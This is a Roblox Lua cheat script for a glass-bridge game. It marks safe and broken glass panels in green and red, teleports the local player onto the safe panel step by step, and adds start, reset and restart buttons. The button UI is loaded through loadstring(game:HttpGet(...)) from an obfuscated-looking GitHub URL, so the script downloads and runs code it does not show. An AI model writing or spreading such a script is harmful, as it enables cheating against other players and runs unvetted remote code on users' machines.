local ws = game:GetService("Workspace")
local gpf = ws:WaitForChild("GlassParts")
local plrs = game:GetService("Players")
local runService = game:GetService("RunService")

local gUpd = Instance.new("BindableEvent")
local lastBrokenGlass = nil
local gameReset = false

local isMovementEnabled = false
local isGameStarted = false

local function setupGP()
    for _, m in pairs(gpf:GetChildren()) do
        if m:IsA("Model") then
            for _, p in ipairs(m:GetChildren()) do
                p.Touched:Connect(function(hit)
                    if isGameStarted and hit.Parent:FindFirstChild("Humanoid") then
                        p.BrickColor = BrickColor.new("Lime green")
                        gUpd:Fire(m)
                    end
                end)
                
                p:GetPropertyChangedSignal("Transparency"):Connect(function()
                    if isGameStarted and p.Transparency == 1 then
                        local localPlayer = plrs.LocalPlayer
                        if localPlayer and localPlayer.Character then
                            local hrp = localPlayer.Character:FindFirstChild("HumanoidRootPart")
                            if hrp and (hrp.Position - p.Position).Magnitude <= 10 then
                                lastBrokenGlass = m
                                gUpd:Fire(m)
                            end
                        end
                    end
                end)
            end
        end
    end
end

local function updMarks(m)
    if not isGameStarted then return end
    local ps = m:GetChildren()
    if ps[1].Transparency == 1 then
        ps[1].BrickColor = BrickColor.new("Really red")
        ps[2].BrickColor = BrickColor.new("Lime green")
    elseif ps[2].Transparency == 1 then
        ps[2].BrickColor = BrickColor.new("Really red")
        ps[1].BrickColor = BrickColor.new("Lime green")
    end
end

local function getGoodGlass(m)
    for _, p in ipairs(m:GetChildren()) do
        if p.Transparency < 1 then
            return p
        end
    end
    return m:GetChildren()[1]
end

local function movePlr(plr, tgtM)
    if not isMovementEnabled or not isGameStarted then return end
    if plr == plrs.LocalPlayer then
        local char = plr.Character
        if char then
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local tgtP = getGoodGlass(tgtM)
                local targetPosition = tgtP.Position + Vector3.new(0, tgtP.Size.Y + hrp.Size.Y/2, 0)
                hrp.CFrame = CFrame.new(targetPosition)
                hrp.Velocity = Vector3.new(0, 0, 0)
            end
        end
    end
end

local function getNextM(currMNum)
    local nextMNum = currMNum + 1
    local nextM = gpf:FindFirstChild(tostring(nextMNum))
    return nextM
end

local function getMostAdvancedBrokenGlass()
    if gameReset then
        gameReset = false
        return gpf:FindFirstChild("1")
    end

    local highestNumber = 0
    local mostAdvancedGlass = nil
    
    for _, m in pairs(gpf:GetChildren()) do
        if m:IsA("Model") then
            local number = tonumber(m.Name)
            if number and number > highestNumber then
                for _, p in ipairs(m:GetChildren()) do
                    if p.Transparency == 1 then
                        highestNumber = number
                        mostAdvancedGlass = m
                        break
                    end
                end
            end
        end
    end
    
    return mostAdvancedGlass or gpf:FindFirstChild("1")
end

local function onPlrAdded(plr)
    local currM = getMostAdvancedBrokenGlass()
    local canMove = true
    
    local function onCharAdded(char)
        if not isGameStarted then return end
        currM = getMostAdvancedBrokenGlass()
        task.wait(1)
        movePlr(plr, currM)
        canMove = true
        
        local humanoid = char:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            canMove = false
            currM = getMostAdvancedBrokenGlass()
        end)
    end
    
    plr.CharacterAdded:Connect(onCharAdded)
    if plr.Character then
        onCharAdded(plr.Character)
    end
    
    gUpd.Event:Connect(function(updM)
        if not isGameStarted then return end
        if updM == currM and canMove and isMovementEnabled then
            canMove = false
            task.wait(0.5)
            
            local nextM = getNextM(tonumber(currM.Name))
            if nextM then
                currM = nextM
                movePlr(plr, currM)
            end
            
            canMove = true
        end
    end)
end

local function killPlr()
    if not isGameStarted then return end
    local char = plrs.LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        char.Humanoid.Health = 0
    end
end

local function tpLast()
    if not isGameStarted or not isMovementEnabled then return end
    local mostAdvancedGlass = getMostAdvancedBrokenGlass()
    if mostAdvancedGlass then
        movePlr(plrs.LocalPlayer, mostAdvancedGlass)
    end
end

local function restartProgress()
    if not isGameStarted then return end
    gameReset = true
    lastBrokenGlass = nil
    
    for _, m in pairs(gpf:GetChildren()) do
        if m:IsA("Model") then
            for _, p in ipairs(m:GetChildren()) do
                p.Transparency = 0
                p.BrickColor = BrickColor.new("Bright blue")
            end
        end
    end
    
    local firstModel = gpf:FindFirstChild("1")
    if firstModel then
        movePlr(plrs.LocalPlayer, firstModel)
    end
end

local function startGame()
    isGameStarted = not isGameStarted
    isMovementEnabled = not isMovementEnabled
local char = plrs.LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
char.Humanoid.Health = 0
end
end

setupGP()
gUpd.Event:Connect(updMarks)

for _, plr in ipairs(plrs:GetPlayers()) do
    onPlrAdded(plr)
end
plrs.PlayerAdded:Connect(onPlrAdded)

runService.Heartbeat:Connect(function()
    if not isGameStarted then return end
    local char = plrs.LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.Anchored = not isMovementEnabled
    end
end)

local MiniUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/go.lua"))()

local ui = MiniUI:new()

ui:Btn("Start Game", startGame)
ui:Btn("Reset Plyer", killPlr)
ui:Btn("Reiniciar Progreso", restartProgress)
